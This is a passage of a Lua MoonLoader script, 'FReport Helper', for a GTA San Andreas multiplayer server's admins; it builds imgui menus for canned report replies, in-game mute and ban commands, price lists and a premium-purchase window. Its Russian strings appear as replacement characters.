	        	sampAddChatMessage(tag.."{FFFFFF} �� �������� ������ �������, ��� �� �����.", 0xFFFFFF)
	        end)
				end
		if imgui.Button(u8'�������� ���������', imgui.ImVec2(150, 22)) then
				main_window_state.v = false
        	prices_window_state.v = false
        	gps_window_state.v = false
        	lua_thread.create(function()
        		sampSendDialogResponse(id_dialog, 1, nil, "��������� �����, ������������� ��� ��������� ���������.")
        		wait(100)
        		sampCloseCurrentDialogWithButton(0)
        		wait(500)
	        	--sampSendChat("/jail "..nick_report .." 0 0")
	        	sampAddChatMessage(tag.."{FFFFFF} �� �������� ������ �������, ����� �������� ���������.", 0xFFFFFF)
	        end)
				end
			imgui.SameLine()
			if imgui.Button(u8'�� ������', imgui.ImVec2(150, 22)) then
				main_window_state.v = false
        	prices_window_state.v = false
        	gps_window_state.v = false
        	lua_thread.create(function()
        			sampSendDialogResponse(id_dialog, 1, nil, "��������� �����, �� ������.")
        		wait(100)
        		sampCloseCurrentDialogWithButton(0)
        		wait(500)
	        	--sampSendChat("/jail "..nick_report .." 0 0")
	        	sampAddChatMessage(tag.."{FFFFFF} �� �������� ������ �������, ��� �� ������.", 0xFFFFFF)
	        end)
				end
				imgui.SameLine()
				if imgui.Button(u8'�������� � �������', imgui.ImVec2(150, 22)) then
				main_window_state.v = false
        	prices_window_state.v = false
        	gps_window_state.v = false
        	lua_thread.create(function()
        		sampSendDialogResponse(id_dialog, 1, nil, "��������� �����, �������� ���� ������ � �������.")
        		wait(100)
        		sampCloseCurrentDialogWithButton(0)
        		wait(500)
	        	--sampSendChat("/jail "..nick_report .." 0 0")
	        	sampAddChatMessage(tag.."{FFFFFF} �� �������� ������ �������, ����� �������� � �������.", 0xFFFFFF)
	        end)
				end
	
		if imgui.CollapsingHeader(u8"                    LVL ������ ��� ���������� �� �������� ������", imgui.ImVec2(110, 22)) then
         
		 
		   if imgui.Button(u8'��������� �����', imgui.ImVec2(110, 22)) then
        	main_window_state.v = false
        	prices_window_state.v = false
        	gps_window_state.v = false
        	lua_thread.create(function()
        		sampSendDialogResponse(id_dialog, 1, nil, '��������� �����, ������� ������ ��� ������ "��������� �����" - 1 LVL.')
        		wait(100)
        		sampCloseCurrentDialogWithButton(0)
        		wait(1000)
	        	
	        end)
        end
		imgui.SameLine()
		 if imgui.Button(u8'�������� ��������', imgui.ImVec2(120, 22)) then
        	main_window_state.v = false
        	prices_window_state.v = false
        	gps_window_state.v = false
        	lua_thread.create(function()
        		sampSendDialogResponse(id_dialog, 1, nil, '��������� �����, ������� ������ ��� ������ "�������� ��������" - 2 LVL.')
        		wait(100)
        		sampCloseCurrentDialogWithButton(0)
        		wait(1000)
	        	
	        end)
        end
		imgui.SameLine()
		   if imgui.Button(u8'�����������', imgui.ImVec2(100, 22)) then
        	main_window_state.v = false
        	prices_window_state.v = false
        	gps_window_state.v = false
        	lua_thread.create(function()
        		sampSendDialogResponse(id_dialog, 1, nil, '��������� �����, ������� ������ ��� ������ "�����������" - 3 LVL.')
        		wait(100)
        		sampCloseCurrentDialogWithButton(0)
        		wait(1000)
	        	
	        end)
        end
		imgui.SameLine()
		   if imgui.Button(u8'����������', imgui.ImVec2(103, 22)) then
        	main_window_state.v = false
        	prices_window_state.v = false
        	gps_window_state.v = false
        	lua_thread.create(function()
        		sampSendDialogResponse(id_dialog, 1, nil, '��������� �����, ������� ������ ��� ������ "����������" - 6 LVL.')
        		wait(100)
        		sampCloseCurrentDialogWithButton(0)
        		wait(1000)
	        	
	        end)
        end
			 imgui.CenterTextColoredRGB('~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~')
		 if imgui.Button(u8'��������� �����', imgui.ImVec2(110, 22)) then
        	main_window_state.v = false
        	prices_window_state.v = false
        	gps_window_state.v = false
        	lua_thread.create(function()
        		sampSendDialogResponse(id_dialog, 1, nil, '��������� �����, ������� ������ ��� ������ "��������� �����" - 8 LVL.')
        		wait(100)
        		sampCloseCurrentDialogWithButton(0)
        		wait(1000)
	        	
	        end)
        end
		--imgui.SameLine()
		imgui.SameLine()
		
		 if imgui.Button(u8'��������', imgui.ImVec2(96, 22)) then
        	main_window_state.v = false
        	prices_window_state.v = false
        	gps_window_state.v = false
        	lua_thread.create(function()
        		sampSendDialogResponse(id_dialog, 1, nil, '��������� �����, ������� ������ ��� ������ "��������" - 10 LVL.')
        		wait(100)
        		sampCloseCurrentDialogWithButton(0)
        		wait(1000)
	        	
	        end)
        end
		imgui.SameLine()
		   if imgui.Button(u8'�������� ������', imgui.ImVec2(114, 22)) then
        	main_window_state.v = false
        	prices_window_state.v = false
        	gps_window_state.v = false
        	lua_thread.create(function()
        		sampSendDialogResponse(id_dialog, 1, nil, '��������� �����, ������� ������ ��� ������ "�������� ������" - 12 LVL.')
        		wait(100)
        		sampCloseCurrentDialogWithButton(0)
        		wait(1000)
	        	
	        end)
        end
		imgui.SameLine()
		 if imgui.Button(u8'�������� �������', imgui.ImVec2(114, 22)) then
        	main_window_state.v = false
        	prices_window_state.v = false
        	gps_window_state.v = false
        	lua_thread.create(function()
        		sampSendDialogResponse(id_dialog, 1, nil, '��������� �����, ������� ������ ��� ������ "�������� �������" - 14 LVL.')
        		wait(100)
        		sampCloseCurrentDialogWithButton(0)
        		wait(1000)
	        	
	        end)
        end
		--imgui.SameLine()
	--	imgui.Text(u8"                             ")
		 imgui.CenterTextColoredRGB('~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~')
		   if imgui.Button(u8'�����', imgui.ImVec2(102, 22)) then
        	main_window_state.v = false
        	prices_window_state.v = false
        	gps_window_state.v = false
        	lua_thread.create(function()
        		sampSendDialogResponse(id_dialog, 1, nil, '��������� �����, ������� ������ ��� ������ "�����" - 16 LVL.')
        		wait(100)
        		sampCloseCurrentDialogWithButton(0)
        		wait(1000)
	        	
	        end)
        end
		imgui.SameLine()
		 if imgui.Button(u8'��������� �������', imgui.ImVec2(128, 22)) then
        	main_window_state.v = false
        	prices_window_state.v = false
        	gps_window_state.v = false
        	lua_thread.create(function()
        		sampSendDialogResponse(id_dialog, 1, nil, '��������� �����, ������� ������ ��� ������ "��������� �������" - 18 LVL.')
        		wait(100)
        		sampCloseCurrentDialogWithButton(0)
        		wait(1000)
	        	
	        end)
        end
		imgui.SameLine()
		 if imgui.Button(u8'��������', imgui.ImVec2(102, 22)) then
        	main_window_state.v = false
        	prices_window_state.v = false
        	gps_window_state.v = false
        	lua_thread.create(function()
        		sampSendDialogResponse(id_dialog, 1, nil, '��������� �����, ������� ������ ��� ������ "��������" - 20 LVL.')
        		wait(100)
        		sampCloseCurrentDialogWithButton(0)
        		wait(1000)
	        	
	        end)
        end
		imgui.SameLine()
		 if imgui.Button(u8'��������', imgui.ImVec2(102, 22)) then
        	main_window_state.v = false
        	prices_window_state.v = false
        	gps_window_state.v = false
        	lua_thread.create(function()
        		sampSendDialogResponse(id_dialog, 1, nil, '��������� �����, ������� ������ ��� ������ "��������" - 22 LVL.')
        		wait(100)
        		sampCloseCurrentDialogWithButton(0)
        		wait(1000)
	        	
	        end)
        end
		
		end
	imgui.Separator()
	    if imgui.Button(u8'��������������� /mn', imgui.ImVec2(-0.1, 22)) then
        main_window_state.v = false
        	prices_window_state.v = false
        	gps_window_state.v = false
mn.v = true			
        end
	imgui.Separator()
		imgui.CenterTextColoredRGB('���������������� ������:', main_window_state)
		imgui.BeginChild("polzovatel", imgui.ImVec2(0, 55), true)
		 if imgui.Button(cfg.settings.pervayaknopka, imgui.ImVec2(143, 22)) then
        
			if cfg.settings.pervayatext == none then 
		sampAddChatMessage('{ffdead}[FReport Helper]: {FFFFFF}��� ���� ������ ��� ����������� ������.', 0xffdead)
	else
		
			main_window_state.v = false
        	prices_window_state.v = false
        	gps_window_state.v = false
	lua_thread.create(function()
	sampSendDialogResponse(id_dialog, 1, nil, u8:decode(cfg.settings.pervayatext))
	wait(100)
        		sampCloseCurrentDialogWithButton(0)
        		wait(1000)
					sampAddChatMessage(tag.."{FFFFFF} �� �������� ������ � ������� ������: {ffdead}"..u8:decode(cfg.settings.pervayaknopka).. ' .', 0xFFFFFF)
					end)
	
		
	end
        end
		imgui.SameLine()
			if imgui.Button(cfg.settings.dvaknopka, imgui.ImVec2(143, 22)) then
        
        	
        					if cfg.settings.dvatext == none then 
		sampAddChatMessage('{ffdead}[FReport Helper]: {FFFFFF}��� ���� ������ ��� ����������� ������.', 0xffdead)
	else
		
			main_window_state.v = false
        	prices_window_state.v = false
        	gps_window_state.v = false
	lua_thread.create(function()
	sampSendDialogResponse(id_dialog, 1, nil, u8:decode(cfg.settings.dvatext))
	wait(100)
        		sampCloseCurrentDialogWithButton(0)
        		wait(1000)
					sampAddChatMessage(tag.."{FFFFFF} �� �������� ������ � ������� ������: {ffdead}"..u8:decode(cfg.settings.dvaknopka).. ' .', 0xFFFFFF)
		end)			
	
		
	end
	end
		imgui.SameLine()
		if imgui.Button(cfg.settings.triknopka, imgui.ImVec2(143, 22)) then
		if testpremium == 0 then
		sampAddChatMessage("{ffdead}[FReport Helper]: {ffffff}� ��� ��� ������� � ������ ������.", 0xFFFFFF)
		else
        	
        	
        					if cfg.settings.tritext == none then 
		sampAddChatMessage('{ffdead}[FReport Helper]: {FFFFFF}��� ���� ������ ��� ����������� ������.', 0xffdead)
	else
		
			main_window_state.v = false
        	prices_window_state.v = false
        	gps_window_state.v = false
	lua_thread.create(function()
	sampSendDialogResponse(id_dialog, 1, nil, u8:decode(cfg.settings.tritext))
	wait(100)
        		sampCloseCurrentDialogWithButton(0)
        		wait(1000)
					sampAddChatMessage(tag.."{FFFFFF} �� �������� ������ � ������� ������: {ffdead}"..u8:decode(cfg.settings.triknopka).. ' .', 0xFFFFFF)
		end)			
	end
		
	end
	end
		imgui.Separator()
		if imgui.Button(cfg.settings.chetiriknopka, imgui.ImVec2(143, 22)) then
		if testpremium == 0 then
		sampAddChatMessage("{ffdead}[FReport Helper]: {ffffff}� ��� ��� ������� � ������ ������.", 0xFFFFFF)
		else
        
        					if cfg.settings.chetiritext == none then 
		sampAddChatMessage('{ffdead}[FReport Helper]: {FFFFFF}��� ���� ������ ��� ����������� ������.', 0xffdead)
	else
		
			main_window_state.v = false
        	prices_window_state.v = false
        	gps_window_state.v = false
	lua_thread.create(function()
	sampSendDialogResponse(id_dialog, 1, nil, u8:decode(cfg.settings.chetiritext))
	wait(100)
        		sampCloseCurrentDialogWithButton(0)
        		wait(1000)
					sampAddChatMessage(tag.."{FFFFFF} �� �������� ������ � ������� ������: {ffdead}"..u8:decode(cfg.settings.chetiriknopka).. ' .', 0xFFFFFF)
		end)			
	end
		
	end
	end
		imgui.SameLine()
			if imgui.Button(cfg.settings.pyatknopka, imgui.ImVec2(143, 22)) then
			if testpremium == 0 then
		sampAddChatMessage("{ffdead}[FReport Helper]: {ffffff}� ��� ��� ������� � ������ ������.", 0xFFFFFF)
		else
        	
        	
        					if cfg.settings.pyattext == none then 
		sampAddChatMessage('{ffdead}[FReport Helper]: {FFFFFF}��� ���� ������ ��� ����������� ������.', 0xffdead)
	else
		
			main_window_state.v = false
        	prices_window_state.v = false
        	gps_window_state.v = false
	lua_thread.create(function()
	sampSendDialogResponse(id_dialog, 1, nil, u8:decode(cfg.settings.pyattext))
	wait(100)
        		sampCloseCurrentDialogWithButton(0)
        		wait(1000)
					sampAddChatMessage(tag.."{FFFFFF} �� �������� ������ � ������� ������: {ffdead}"..u8:decode(cfg.settings.pyatknopka).. ' .', 0xFFFFFF)
		end)			
	end
		
	end
	end
		imgui.SameLine()
				if imgui.Button(cfg.settings.shestknopka, imgui.ImVec2(143, 22)) then
				if testpremium == 0 then
		sampAddChatMessage("{ffdead}[FReport Helper]: {ffffff}� ��� ��� ������� � ������ ������.", 0xFFFFFF)
		else
        	
        	
        					if cfg.settings.shesttext == none then 
		sampAddChatMessage('{ffdead}[FReport Helper]: {FFFFFF}��� ���� ������ ��� ����������� ������.', 0xffdead)
	else
		
			main_window_state.v = false
        	prices_window_state.v = false
        	gps_window_state.v = false
	lua_thread.create(function()
	sampSendDialogResponse(id_dialog, 1, nil, u8:decode(cfg.settings.shesttext))
	wait(100)
        		sampCloseCurrentDialogWithButton(0)
        		wait(1000)
					sampAddChatMessage(tag.."{FFFFFF} �� �������� ������ � ������� ������: {ffdead}"..u8:decode(cfg.settings.shestknopka).. ' .', 0xFFFFFF)
		end)			
	end
		
	end
	end
		imgui.Separator()
					if imgui.Button(cfg.settings.semknopka, imgui.ImVec2(143, 22)) then
					if testpremium == 0 then
		sampAddChatMessage("{ffdead}[FReport Helper]: {ffffff}� ��� ��� ������� � ������ ������.", 0xFFFFFF)
		else
        	
        					if cfg.settings.semtext == none then 
		sampAddChatMessage('{ffdead}[FReport Helper]: {FFFFFF}��� ���� ������ ��� ����������� ������.', 0xffdead)
	else
		
			main_window_state.v = false
        	prices_window_state.v = false
        	gps_window_state.v = false
	lua_thread.create(function()
	sampSendDialogResponse(id_dialog, 1, nil, u8:decode(cfg.settings.semtext))
	wait(100)
        		sampCloseCurrentDialogWithButton(0)
        		wait(1000)
					sampAddChatMessage(tag.."{FFFFFF} �� �������� ������ � ������� ������: {ffdead}"..u8:decode(cfg.settings.semknopka).. ' .', 0xFFFFFF)
		end)			
	end
		
	end
	end
		imgui.SameLine()
						if imgui.Button(cfg.settings.vosemknopka, imgui.ImVec2(143, 22)) then
						if testpremium == 0 then
		sampAddChatMessage("{ffdead}[FReport Helper]: {ffffff}� ��� ��� ������� � ������ ������.", 0xFFFFFF)
		else
        	
        					if cfg.settings.vosemtext == none then 
		sampAddChatMessage('{ffdead}[FReport Helper]: {FFFFFF}��� ���� ������ ��� ����������� ������.', 0xffdead)
	else
		
			main_window_state.v = false
        	prices_window_state.v = false
        	gps_window_state.v = false
	lua_thread.create(function()
	sampSendDialogResponse(id_dialog, 1, nil, u8:decode(cfg.settings.vosemtext))
	wait(100)
        		sampCloseCurrentDialogWithButton(0)
        		wait(1000)
					sampAddChatMessage(tag.."{FFFFFF} �� �������� ������ � ������� ������: {ffdead}"..u8:decode(cfg.settings.vosemknopka).. ' .', 0xFFFFFF)
		end)			
	end
		
	end
	end
		imgui.SameLine()
								if imgui.Button(cfg.settings.devyatknopka, imgui.ImVec2(143, 22)) then
								if testpremium == 0 then
		sampAddChatMessage("{ffdead}[FReport Helper]: {ffffff}� ��� ��� ������� � ������ ������.", 0xFFFFFF)
		else
        	
        	
        					if cfg.settings.devyattext == none then 
		sampAddChatMessage('{ffdead}[FReport Helper]: {FFFFFF}��� ���� ������ ��� ����������� ������.', 0xffdead)
	else
		
			main_window_state.v = false
        	prices_window_state.v = false
        	gps_window_state.v = false
	lua_thread.create(function()
	sampSendDialogResponse(id_dialog, 1, nil, u8:decode(cfg.settings.devyattext))
	wait(100)
        		sampCloseCurrentDialogWithButton(0)
        		wait(1000)
					sampAddChatMessage(tag.."{FFFFFF} �� �������� ������ � ������� ������: {ffdead}"..u8:decode(cfg.settings.devyatknopka).. ' .', 0xFFFFFF)
		end)			
	end
		
	end
	end
		imgui.Separator()
									if imgui.Button(cfg.settings.desyatknopka, imgui.ImVec2(-1, 22)) then
									if testpremium == 0 then
		sampAddChatMessage("{ffdead}[FReport Helper]: {ffffff}� ��� ��� ������� � ������ ������.", 0xFFFFFF)
		else
        	
        	
        					if cfg.settings.desyattext == none then 
		sampAddChatMessage('{ffdead}[FReport Helper]: {FFFFFF}��� ���� ������ ��� ����������� ������.', 0xffdead)
	else
		
			main_window_state.v = false
        	prices_window_state.v = false
        	gps_window_state.v = false
	lua_thread.create(function()
	sampSendDialogResponse(id_dialog, 1, nil, u8:decode(cfg.settings.desyattext))
	wait(100)
        		sampCloseCurrentDialogWithButton(0)
        		wait(1000)
					sampAddChatMessage(tag.."{FFFFFF} �� �������� ������ � ������� ������: {ffdead}"..u8:decode(cfg.settings.desyatknopka).. ' .', 0xFFFFFF)
		end)			
	end
		
	end
	end
		imgui.EndChild()
		imgui.SetCursorPosX(90)
		if imgui.Button(u8'�������� �������� | �������� �����', imgui.ImVec2(300, 22)) then
        	main_window_state.v = false
        	prices_window_state.v = false
        	gps_window_state.v = false
        	izmena.v = true
        end
		imgui.Separator()
		imgui.CenterTextColoredRGB('������� ���������:', main_window_state)
		 if imgui.Button(u8'CAPS', imgui.ImVec2(150, 22)) then
        	main_window_state.v = false
        	prices_window_state.v = false
        	gps_window_state.v = false
        	lua_thread.create(function()
        		sampSendDialogResponse(id_dialog, 1, nil, "��������� �����, �� ������ �������� �� Caps Lock � �������.")
        		wait(100)
        		sampCloseCurrentDialogWithButton(0)
        		wait(1000)
	        	sampSendChat("/rmute "..id_report.." 20 Caps")
				wait(1000)
	        	sampAddChatMessage(tag.."{FFFFFF} �� �������� ������ ������� �� CAPS � �������.", 0xFFFFFF)
        	end)
        end
		imgui.SameLine()
		if imgui.Button(u8'�����������', imgui.ImVec2(150, 22)) then
        	main_window_state.v = false
        	prices_window_state.v = false
        	gps_window_state.v = false
        	lua_thread.create(function()
        		sampSendDialogResponse(id_dialog, 1, nil, "��������� �����, �� ������ �������� �� ����������� � �������.")
        		wait(100)
        		sampCloseCurrentDialogWithButton(0)
        		wait(1000)
	        	sampSendChat("/rmute "..id_report.." 40 �����������(-�)")
				wait(1000)
	        	sampAddChatMessage(tag.."{FFFFFF} �� �������� ������ ������� �� ����������� � �������.", 0xFFFFFF)
        	end)
        end
		imgui.SameLine()
		if imgui.Button(u8'������ 3/3', imgui.ImVec2(150, 22)) then
        	main_window_state.v = false
        	prices_window_state.v = false
        	gps_window_state.v = false
        	lua_thread.create(function()
        		sampSendDialogResponse(id_dialog, 1, nil, "��������� �����, �� ������ �������� �� Offtop 3/3 � �������.")
        		wait(100)
        		sampCloseCurrentDialogWithButton(0)
        		wait(1000)
	        	sampSendChat("/rmute "..id_report.." 20 Offtop 3/3")
				wait(1000)
	        	sampAddChatMessage(tag.."{FFFFFF} �� �������� ������ ������� �� Offtop 3/3 � �������.", 0xFFFFFF)
        	end)
        end
		if imgui.Button(u8'���������� �����', imgui.ImVec2(150, 22)) then
        	main_window_state.v = false
        	prices_window_state.v = false
        	gps_window_state.v = false
        	lua_thread.create(function()
        		sampSendDialogResponse(id_dialog, 1, nil, "��������� �����, �� ������ �������� �� ���������� ����� � �������.")
        		wait(100)
        		sampCloseCurrentDialogWithButton(0)
        		wait(1000)
	        	sampSendChat("/rmute "..id_report.." 120 ���������� �����")
				wait(1000)
	        	sampAddChatMessage(tag.."{FFFFFF} �� �������� ������ ������� �� ���������� ����� � �������.", 0xFFFFFF)
        	end)
        end
		imgui.SameLine()
		if imgui.Button(u8'����������� �����', imgui.ImVec2(150, 22)) then
        	main_window_state.v = false
        	prices_window_state.v = false
        	gps_window_state.v = false
        	lua_thread.create(function()
        		sampSendDialogResponse(id_dialog, 1, nil, "��������� �����, �� ������ �������� �� ����������� �����.")
        		wait(100)
        		sampCloseCurrentDialogWithButton(0)
        		wait(1000)
				if cfg.settings.lvladmin == 1 or cfg.settings.lvladmin == 2 then
				sampSendChat("/a /ban  "..id_report.." 7 ����������� �����")
				wait(500)
				sampAddChatMessage(tag.."{FFFFFF} �� ��������� ����� �� ��������� ������ ������� �� ����������� �����.", 0xFFFFFF)
				else
	        	sampSendChat("/ban  "..id_report.." 7 ����������� �����")
				wait(1000)
	        	sampAddChatMessage(tag.."{FFFFFF} �� �������� ������ ������� �� ����������� �����.", 0xFFFFFF)
				end
        	end)
        end
		imgui.SameLine()
		if imgui.Button(u8'����������� �������', imgui.ImVec2(150, 22)) then
        	main_window_state.v = false
        	prices_window_state.v = false
        	gps_window_state.v = false
        	lua_thread.create(function()
        		sampSendDialogResponse(id_dialog, 1, nil, "��������� �����, �� ������ �������� �� ����������� �������.")
        		wait(100)
        		sampCloseCurrentDialogWithButton(0)
        		wait(1000)
				if cfg.settings.lvladmin == 1 or cfg.settings.lvladmin == 2 then
					sampSendChat("/a /ban "..id_report.." 7 ����������� �������")
					wait(500)
					sampAddChatMessage(tag.."{FFFFFF} �� ��������� ����� �� ��������� ������ ������� �� ����������� �������.", 0xFFFFFF)
					else
	        	sampSendChat("/ban "..id_report.." 7 ����������� �������")
				wait(1000)
	        	sampAddChatMessage(tag.."{FFFFFF} �� �������� ������ ������� �� ����������� �������.", 0xFFFFFF)
				end
        	end)
        end
		if imgui.Button(u8'������������ ������������', imgui.ImVec2(468, 22)) then
        	main_window_state.v = false
        	prices_window_state.v = false
        	gps_window_state.v = false
        	lua_thread.create(function()
        		sampSendDialogResponse(id_dialog, 1, nil, "��������� �����, �� ������ �������� �� ������������ ������������.")
        		wait(100)
        		sampCloseCurrentDialogWithButton(0)
        		wait(1000)
	        	sampSendChat("/rmute "..id_report.." 120 ��������")
				wait(1000)
	        	sampAddChatMessage(tag.."{FFFFFF} �� �������� ������ ������� �� ������������ ������������.", 0xFFFFFF)
        	end)
        end
		imgui.Separator()
		
		
		imgui.Text(u8"\n")
        if imgui.Button(u8'���������', imgui.ImVec2(150, 22)) then
          main_window_state.v = false
        	prices_window_state.v = false
        	gps_window_state.v = false
        	lua_thread.create(function()
        		sampSendDialogResponse(id_dialog, 1, nil, u8:decode(text_buffer.v))
        		wait(100)
	          sampCloseCurrentDialogWithButton(0)
        	end)
        end
        imgui.SameLine(330)

        if imgui.Button(u8'�������', imgui.ImVec2(150, 22)) then
        	main_window_state.v = false
        	prices_window_state.v = false
        	gps_window_state.v = false
            lua_thread.create(function()
                sampSendDialogResponse(id_dialog, 0, nil, nil)
                wait(100)
                sampCloseCurrentDialogWithButton(0)
            end)
        end
		imgui.Text(u8"\n")
		imgui.Separator()
		imgui.Text(u8"\n")
		imgui.CenterTextColoredRGB('{32CD32}Nik Everyone                     {FFA500}Samp Umbrella Project {ffdead}� {FFA500}2022                {ffdead}FReport Helper')
		
        imgui.End()
    end
			--imgui.BeginChild("izmena", imgui.ImVec2(0, 330), true)
	if izmena.v then otdelizmena()
	
	end
	if izmenarmenu.v then otdelizmenarmenu()
	
	end
    if prices_window_state.v then otdelprices()
    	
    end
   if gps_window_state.v then otdelgps()
   end
   if mn.v then otdelmn()
   
   end
   if pokupka.v then otdelpokupka()
   
   end
end
shtuka.v = true 
shprice.v = true

function otdelpokupka()
imgui.ShowCursor = true
 imgui.SetNextWindowSize(imgui.ImVec2(700, 518), imgui.Cond.FirstUseEver)
        imgui.SetNextWindowPos(imgui.ImVec2(main_x / 2, main_y / 2), imgui.Cond.FirstUseEver, imgui.ImVec2(0.5, 0.5))
        imgui.Begin(u8"������� FReport Helper Premium", _, imgui.WindowFlags.NoCollapse + imgui.WindowFlags.NoResize  + imgui.WindowFlags.NoBringToFrontOnFocus+ imgui.WindowFlags.NoSavedSettings)
		imgui.PushFont(fsClock) imgui.CenterTextColoredRGB('������� {ffdead}FReport Helper {FFD700}P{ffdead}remium{ffffff}') imgui.PopFont()
			imgui.BeginChild("pokupkachild", imgui.ImVec2(0, 420), true)
	imgui.CenterTextColoredRGB('��� ������ ���������� Premium ��� ����� ��������� {32CD32}50� {ffffff}����� QIWI')
	imgui.SetCursorPosX(35)
	imgui.BeginChild("perevodq", imgui.ImVec2(620, 180), true)
	imgui.SetCursorPosX(240)
	if imgui.Link(u8"������ �� ������ QIWI", u8"�� ������ �������������� �� ���� ������, ��� �� ��������� �����.") then
    os.execute(('explorer.exe "%s"'):format("https://vk.com/away.php?utf=1&to=https%3A%2F%2Fqiwi.com%2Fpayment%2Fform%2F99999"))
end
	imgui.CenterTextColoredRGB('{FF0000}1. {ffdead}�������� ������� �� ��������')
		imgui.CenterTextColoredRGB('{FF0000}2. {ffdead}������� ������� ����������: {ffffff}NIKITAPROKOPIEF')
			imgui.CenterTextColoredRGB('{FF0000}3. {ffdead}������� ����������� � ��������: {FFA500}������ ���������� FReport Helper Premium ��� {32CD32}' .. nick:gsub('%[PC%]', '').. '{ffffff}.')
			imgui.CenterTextColoredRGB('{FF0000}4. {ffdead}�������� ������ ������ ������')
			imgui.CenterTextColoredRGB('{FF0000}5. {ffdead}������� �����: {32CD32}50�')
			imgui.CenterTextColoredRGB('{FF0000}6. {ffdead}������� ������ "{ffffff}��������{ffdead}"')
			imgui.NewLine()
			imgui.TextColoredRGB('{FF0000}7. {ffdead}����� ���������� ������, ��� ���������� ��������  -')
			imgui.SameLine() 
			if imgui.Link(u8"������", u8"��������  S U P , ����������� ��.") then
    os.execute(('explorer.exe "%s"'):format("https://vk.com/nikeveryone"))
end
imgui.SameLine()
			imgui.TextColoredRGB('{ffdead}� ������������ ��������� ������')
			
	imgui.EndChild()
	imgui.NewLine()
	imgui.Separator()
	imgui.Separator()
	imgui.CenterTextColoredRGB('{ffdead}����� ���������� ����������������� ��������, ��� ����� ����� ��� ���������.')
	imgui.CenterTextColoredRGB('{ffdead}FReport Helper {FFA500}P{ffdead}remium �������� {32CD32}��������{ffdead}, ���� �� ������� ������, ������ ������� ��� ��������� ������.')
	imgui.Separator()
	imgui.Separator()
	
	imgui.NewLine()
	imgui.Separator()
	imgui.Separator()
	imgui.CenterTextColoredRGB('{ffdead}�� ������ {FF0000}���������� {ffdead}�� ���������� Premium � ������� ������ {ffdead} � ������� 12 ����� ����� �������.')
	--	imgui.CenterTextColoredRGB('{ffdead} � ������� 12 ����� ����� �������.')
	imgui.Separator()
	imgui.Separator()
	
	imgui.NewLine()
	imgui.Separator()
	imgui.Separator()
	
	imgui.TextColoredRGB('                       {ffdead}��� ��������� �������� ��� ������� � ��������� ����������� -')
	imgui.SameLine() 
			if imgui.Link(u8"������ ���������", u8"��������  S U P , ����������� ��.") then
    os.execute(('explorer.exe "%s"'):format("https://vk.com/nikeveryone"))
end
	imgui.Separator()
	imgui.Separator()
	imgui.NewLine()
	imgui.PushFont(fsClock) imgui.CenterTextColoredRGB('{FFA500}S U P {ffdead}� {FFA500}2022') imgui.PopFont()
		imgui.EndChild()
		imgui.SetCursorPosX(80)
		--imgui.SetCursorPosY(370)
		if imgui.Button(u8"����� �� ������ ���������", imgui.ImVec2(530, 35)) then
		admmenu.v = true
        
        	pokupka.v = false
end
	

 
	imgui.End()

end

function otdelprices()
imgui.SetNextWindowSize(imgui.ImVec2(290, 464), imgui.Cond.FirstUseEver)
     imgui.SetNextWindowPos(imgui.ImVec2(main_x / 2, main_y / 2), imgui.Cond.FirstUseEver, imgui.ImVec2(1.9, 0.5))
        imgui.Begin(u8"��������������� ���� ����������", _, imgui.WindowFlags.NoCollapse + imgui.WindowFlags.NoResize + imgui.WindowFlags.NoMove + imgui.WindowFlags.NoBringToFrontOnFocus+ imgui.WindowFlags.NoSavedSettings)
       if shprice.v == false and shpricedva.v == false then
		shprice.v = true 
		end
		imgui.TextColoredRGB('������� �����')
		imgui.SameLine()
		if imgui.Checkbox(u8"", shprice) then
    sampAddChatMessage('{ffdead}[FReport Helper]: {FFFFFF}��������������� ���.���� �/� {32CD32}����������� {ffffff}�� ������� �����.', 0xffdead)
		--shtukadva.v = false
		
		shpricedva.v = false
    end
	imgui.SameLine()
	imgui.CenterTextColoredRGB('|')
	imgui.SameLine()
	if imgui.Checkbox(u8"������. �����", shpricedva) then
         --  sampAddChatMessage('{ffdead}[FReport Helper]: {FFFFFF}��������������� ���.���� �/� {32CD32}����������� {ffffff}�� ������������ �����.', 0xffdead)
		    sampAddChatMessage('{ffdead}[FReport Helper]: {FFFFFF}� ����������.', 0xffdead)
			--`shtuka.v = false
			shprice.v = false
		
    end
	   if imgui.CollapsingHeader(u8"��������� Los-Santos [Nope]") then
            imgui.Text(pricesall.prices1)
        end
        if imgui.CollapsingHeader(u8"��������� San-Fierro [C]") then
            imgui.Text(pricesall.prices2)
        end
        if imgui.CollapsingHeader(u8"��������� San-Fierro [B]") then
            imgui.Text(pricesall.prices3)
        end
        if imgui.CollapsingHeader(u8"��������� Las-Venturas [A]") then
            imgui.Text(pricesall.prices4)
        end
		if imgui.CollapsingHeader(u8"��������� Las-Venturas [Real Cars]") then
           imgui.Text(pricesall.pricesrealcars)
		   imgui.Text(pricesall.pricesrealcars2)
		   imgui.Text(pricesall.pricesrealcars3)
        end
        if imgui.CollapsingHeader(u8"���������") then
            imgui.Text(pricesall.prices5)
        end
        if imgui.CollapsingHeader(u8"���������") then
            imgui.Text(pricesall.prices6)
        end
        if imgui.CollapsingHeader(u8"���-����") then
            imgui.Text(pricesall.prices7)
        end
	--[[	imgui.Text(u8"")
		imgui.Text(u8"")
		imgui.Text(u8"")
		imgui.Text(u8"")
		imgui.Text(u8"")
		imgui.Text(u8"")
		imgui.Text(u8"")
		imgui.Text(u8"")
		imgui.Text(u8"")
			
				imgui.Text(u8"")
					
		imgui.Text(u8"\n\n")--]]
		imgui.NewLine()
		imgui.NewLine()
		imgui.NewLine()
		imgui.NewLine()
		imgui.NewLine()
		imgui.NewLine()
		imgui.NewLine()
		imgui.NewLine()
		imgui.NewLine()
		imgui.NewLine()
		
		imgui.NewLine()
		imgui.NewLine()
		--imgui.SetCursorPosY(440)
		imgui.Separator()
		imgui.Separator()
		--imgui.SetCursorPosY(393)
		imgui.CenterTextColoredRGB('{FFA500}S U P {ffdead}� {FFA500}2022')
        imgui.End()
end

function otdelmn()
imgui.ShowCursor = true
imgui.SetNextWindowSize(imgui.ImVec2(485, 595), imgui.Cond.FirstUseEver)
        imgui.SetNextWindowPos(imgui.ImVec2(main_x / 2, main_y / 2), imgui.Cond.FirstUseEver, imgui.ImVec2(0.5, 0.5))
    	imgui.Begin(u8"��������������� /mn", _, imgui.WindowFlags.NoCollapse + imgui.WindowFlags.NoResize + imgui.WindowFlags.NoMove + imgui.WindowFlags.NoBringToFrontOnFocus+ imgui.WindowFlags.NoSavedSettings)
    if mn.v then 
		okno.v = false
